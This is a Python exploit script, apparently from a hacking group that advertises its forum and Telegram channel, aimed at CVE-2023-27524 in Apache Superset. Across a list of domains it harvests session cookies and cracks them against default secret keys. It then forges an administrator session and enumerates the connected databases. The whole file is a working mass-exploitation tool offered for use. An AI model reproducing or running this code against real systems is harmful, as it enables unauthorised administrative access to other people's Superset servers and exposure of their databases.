# Author: Pari Malam

import requests, os, sys, colorama, urllib3, concurrent.futures
from flask_unsign import session
from sys import stdout
from colorama import Fore, init
import argparse
import glob
import re
from time import sleep
from requests import Request, Session
from flask_session import Session
init(autoreset=True)
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if not os.path.exists('Results'):
    os.mkdir('Results')

os.system('clear' if os.name == 'posix' else 'cls')


def banners():
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   TELEGRAM.ME/DRAGONFORCEIO                     "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[CVE-2023-27524] - {Fore.GREEN}PERFORM WITH APACHE SUPERSET CREDIENTALs LEAK\n")
banners()



SECRET_KEYS = [
    b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',  # version < 1.4.1
    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1
    b'thisISaSECRET_1234',                            # deployment template
    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation
    b'TEST_NON_DEV_SECRET'                            # docker compose
]


def main():
    parser = argparse.ArgumentParser(description='Scan Superset instance for CVE-2023-27524')
    parser.add_argument('-f', '--file', action='store', help='File containing domains to scan or directory to scan files from', required=True)

    args = parser.parse_args()

    if os.path.isdir(args.file):
        files = glob.glob(args.file + "/*.txt")
        if not files:
            print(f'{Fore.RED}Error: No text files found in directory {args.file}{Fore.RESET}')
            return
        for file in files:
            with open(file) as f:
                domains = [line.strip() for line in f.readlines()]
            for domain in domains:
                url = f'https://{domain}/login/'
                scan(url)
    else:
        with open(args.file) as f:
            domains = [line.strip() for line in f.readlines()]

        for domain in domains:
            url = f'https://{domain}/login/'
            scan(url)


def scan(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0'
    }
    try:
        resp = requests.get(url, headers=headers, verify=True, timeout=30, allow_redirects=False)
        if resp.status_code != 200:
            print(f'{Fore.RED}[CVE-2023-27524] Error retrieving login page at {url}, status code: {resp.status_code}{Fore.RESET}')
            return

        session_cookie = None
        for c in resp.cookies:
            if c.name == 'session':
                session_cookie = c.value
                break

        if not session_cookie:
            print(f'{Fore.RED}[CVE-2023-27524] Error: No session cookie found{Fore.RESET}')
            return

        print(f'{Fore.YELLOW}[CVE-2023-27524] .: {Fore.RED}[W00T!] - {Fore.GREEN}{session_cookie}{Fore.RESET}')
        with open("Results/Cookies.txt", "w") as file:
            file.write(url + '\n' + session_cookie + "\n\n")

        try:
            decoded = session.decode(session_cookie)
            print(f'{Fore.YELLOW}[CVE-2023-27524] .: {Fore.GREEN}[DECODED SESSION!] - {Fore.YELLOW}{decoded}{Fore.RESET}')
        except:
            print(f'{Fore.GREEN}[CVE-2023-27524] Error: Not a Flask session cookie{Fore.RESET}')
            return

        match = re.search(r'&#34;version_string&#34;: &#34;(.*?)&#34', resp.text)
        if match:
            version = match.group(1)
        else:
            version = 'Unknown'

        print(f'{Fore.YELLOW}[CVE-2023-27524] Superset Version: {version}{Fore.RESET}')

        for i, k in enumerate(SECRET_KEYS):
            cracked = session.verify(session_cookie, k)
            if cracked:
                break

        if not cracked:
            print(f'{Fore.RED}[CVE-2023-27524] Failed to crack session cookie{Fore.RESET}')
            return

        forged_cookie = session.sign({'_user_id': '1', 'user_id': '1'}, k)
        print(f'[CVE-2023-27524] Forged session cookie: {forged_cookie}')

        resp = requests.get(url, headers=headers, cookies={'session': forged_cookie}, verify=True, timeout=30, allow_redirects=False)
        if resp.status_code == 302:
            print(f'{Fore.GREEN}[CVE-2023-27524] Got 302 on login, forged cookie appears to have been accepted{Fore.RESET}')
        else:
            print(f'{Fore.RED}[CVE-2023-27524] Got status code {resp.status_code} on login instead of expected redirect 302. Forged cookie does not appear to be valid{Fore.RESET}')
            return

        print(f'{Fore.YELLOW}[CVE-2023-27524] Enumerating databases{Fore.RESET}')
        for i in range(1, 101):
            database_url_base = url.rstrip('/') + '/api/v1/database'
            try:
                r = requests.get(f'{database_url_base}/{i}', headers=headers, cookies={'session': forged_cookie}, verify=True, timeout=30, allow_redirects=True)
                if r.status_code == 200:
                    result = r.json()['result']
                    name = result['database_name']
                    print(f'[CVE-2023-27524] Found database {name}')
                elif r.status_code == 404:
                    print(f'{Fore.GREEN}[CVE-2023-27524] Done enumerating databases{Fore.RESET}')
                    break
                else:
                    print(f'{Fore.RED}[CVE-2023-27524] Unexpected error: status code={r.status_code}{Fore.RESET}')
                    break
            except Exception as e_inner:
                print(f'{Fore.RED}[CVE-2023-27524] Unexpected error: {e_inner}{Fore.RESET}')
                break

    except Exception as e:
        print(f'{Fore.RED}[CVE-2023-27524] Unexpected error: {e}{Fore.RESET}')


if __name__ == '__main__':
    main()